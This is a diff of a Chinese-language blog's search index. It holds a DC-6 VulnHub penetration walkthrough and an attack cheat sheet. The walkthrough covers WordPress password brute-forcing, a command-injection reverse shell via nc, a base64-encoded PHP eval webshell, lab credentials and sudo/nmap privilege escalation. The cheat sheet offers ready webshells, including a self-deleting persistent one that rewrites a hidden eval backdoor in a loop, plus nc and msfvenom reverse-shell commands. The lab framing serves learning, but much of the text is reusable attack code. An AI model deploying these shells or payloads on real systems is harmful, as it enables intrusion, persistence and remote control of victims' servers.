@@ -285,73 +285,6 @@
       </tags>
   </entry>
   <entry>
-    <title>DC-6</title>
-    <url>/2022/04/22/DC-6/</url>
-    <content><![CDATA[<p>渗透环境：DC6 <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机存活扫描"><a href="#主机存活扫描" class="headerlink" title="主机存活扫描"></a>主机存活扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/04/22/DC-6/1.png" alt="img"></p>
-<p>靶机ip为192.168.168.134</p>
-<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.134</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/04/22/DC-6/2.png" alt="img"></p>
-<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://wordy/ -e *</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/04/22/DC-6/4.png" alt="img"></p>
-<p>发现wordpress后台</p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>使用wpscan扫描</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy  --enumerate</span><br></pre></td></tr></table></figure>
-
-<p>发现存在的用户</p>
-<p><img src="/2022/04/22/DC-6/3.png" alt="img"></p>
-<p>使用burp进行爆破，失败<br>在原文下发现提示</p>
-<p><img src="/2022/04/22/DC-6/5.png" alt="img"></p>
-<p>使用提示中的字典</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure>
-
-<p>爆破成功</p>
-<p><img src="/2022/04/22/DC-6/6.png" alt="img"></p>
-<p>登录后台寻找突破口<br>发现一次存在命令执行的地方<br>在kali开启监听端口</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
-
-<p>抓包修改</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | nc 192.168.168.128 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>发送<br>上传木马</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg==&quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure>
-
-<p>蚁剑连接<br>在home下发现线索</p>
-<p><img src="/2022/04/22/DC-6/8.png" alt="img"></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>ssh连接<br>账号：graham<br>密码：GSo7isUM1D4</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/04/22/DC-6/9.png" alt="img"></p>
-<p>发现 &#x2F;home&#x2F;jens&#x2F;backups.sh没有密码<br>往里面添上&#x2F;bin&#x2F;bash</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> /bin/bash &gt;&gt; /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
-
-<p>以jens的身份执行</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
-
-<p>发现当前身份变为jens</p>
-<p><img src="/2022/04/22/DC-6/10.png" alt="img"></p>
-<p>nmap提权</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;os.execute(&quot;/bin/bash&quot;)&#x27;</span> &gt; /tmp/shell</span><br><span class="line">sudo  nmap  --script= /tmp/shell</span><br></pre></td></tr></table></figure>
-
-<p>提权成功</p>
-<p><img src="/2022/04/22/DC-6/11.png" alt="img"></p>
-<p>查看flag</p>
-<p><img src="/2022/04/22/DC-6/12.png" alt="img"></p>
-<p>DC-6 clear</p>
-]]></content>
-      <categories>
-        <category>实践</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DC-5</title>
     <url>/2022/04/17/DC-5/</url>
     <content><![CDATA[<p>渗透环境：DC5 <a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
@@ -429,8 +362,75 @@
       </tags>
   </entry>
   <entry>
-    <title>常用代码汇总</title>
-    <url>/2022/04/17/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E6%B1%87%E6%80%BB/</url>
+    <title>DC-6</title>
+    <url>/2022/04/22/DC-6/</url>
+    <content><![CDATA[<p>渗透环境：DC6 <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机存活扫描"><a href="#主机存活扫描" class="headerlink" title="主机存活扫描"></a>主机存活扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/22/DC-6/1.png" alt="img"></p>
+<p>靶机ip为192.168.168.134</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.134</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/22/DC-6/2.png" alt="img"></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://wordy/ -e *</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/22/DC-6/4.png" alt="img"></p>
+<p>发现wordpress后台</p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>使用wpscan扫描</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy  --enumerate</span><br></pre></td></tr></table></figure>
+
+<p>发现存在的用户</p>
+<p><img src="/2022/04/22/DC-6/3.png" alt="img"></p>
+<p>使用burp进行爆破，失败<br>在原文下发现提示</p>
+<p><img src="/2022/04/22/DC-6/5.png" alt="img"></p>
+<p>使用提示中的字典</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure>
+
+<p>爆破成功</p>
+<p><img src="/2022/04/22/DC-6/6.png" alt="img"></p>
+<p>登录后台寻找突破口<br>发现一次存在命令执行的地方<br>在kali开启监听端口</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<p>抓包修改</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | nc 192.168.168.128 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>发送<br>上传木马</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg==&quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接<br>在home下发现线索</p>
+<p><img src="/2022/04/22/DC-6/8.png" alt="img"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>ssh连接<br>账号：graham<br>密码：GSo7isUM1D4</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/22/DC-6/9.png" alt="img"></p>
+<p>发现 &#x2F;home&#x2F;jens&#x2F;backups.sh没有密码<br>往里面添上&#x2F;bin&#x2F;bash</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> /bin/bash &gt;&gt; /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p>以jens的身份执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p>发现当前身份变为jens</p>
+<p><img src="/2022/04/22/DC-6/10.png" alt="img"></p>
+<p>nmap提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;os.execute(&quot;/bin/bash&quot;)&#x27;</span> &gt; /tmp/shell</span><br><span class="line">sudo  nmap  --script= /tmp/shell</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="/2022/04/22/DC-6/11.png" alt="img"></p>
+<p>查看flag</p>
+<p><img src="/2022/04/22/DC-6/12.png" alt="img"></p>
+<p>DC-6 clear</p>
+]]></content>
+      <categories>
+        <category>实践</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>常用代码汇总（施工中。。。）</title>
+    <url>/2022/04/22/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E6%B1%87%E6%80%BB/</url>
     <content><![CDATA[<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>一句话木马</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;L1ang&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -438,12 +438,34 @@
 
 <p>php内存马</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);   <span class="comment">//1表示，忽略与客户端断开连接，继续执行</span></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);       <span class="comment">//隐藏当前文件</span></span><br><span class="line">    <span class="variable">$file</span>=<span class="string">&quot;.shell.php&quot;</span>;</span><br><span class="line">    <span class="variable">$shell</span>=<span class="string">&quot;&lt;?php unlink(__FILE__);substr(md5(\$_GET[&#x27;user&#x27;]),28)==&#x27;ec6b&#x27;&amp;&amp;eval(\$_POST[&#x27;attack&#x27;]);?&gt;&quot;</span>; <span class="comment">#md5=L1ang</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$shell</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;chmod 777 .shell.php&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">touch</span>(<span class="string">&quot;.shell.php&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="交互shell"><a href="#交互shell" class="headerlink" title="交互shell"></a>交互shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>存活主机</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP IP段</span><br></pre></td></tr></table></figure>
+
+<p>端口探测</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- IP</span><br></pre></td></tr></table></figure>
+
+<h3 id="nc监听"><a href="#nc监听" class="headerlink" title="nc监听"></a>nc监听</h3><p>kali(攻击机)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lpnv 4444</span><br></pre></td></tr></table></figure>
+
+<p>目标机</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc ip 4444 -e /bin/bash </span><br></pre></td></tr></table></figure>
+
+<h3 id="cms信息扫描"><a href="#cms信息扫描" class="headerlink" title="cms信息扫描"></a>cms信息扫描</h3><h4 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url url --enumerate</span><br></pre></td></tr></table></figure>
+
+<h4 id="joomla"><a href="#joomla" class="headerlink" title="joomla"></a>joomla</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">joomscan --url url</span><br></pre></td></tr></table></figure>
+
+<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload payload/php/meterpreter/reverse_tcp //payload根据实际环境选择</span><br><span class="line"><span class="built_in">set</span> lhost IP //攻击机ip</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw &gt; shell.php //生成shell，上传到目标机，LHOST为攻击机IP</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>学习</category>
       </categories>
       <tags>
+        <tag>提权</tag>
         <tag>木马</tag>
+        <tag>命令</tag>
       </tags>
   </entry>
   <entry>
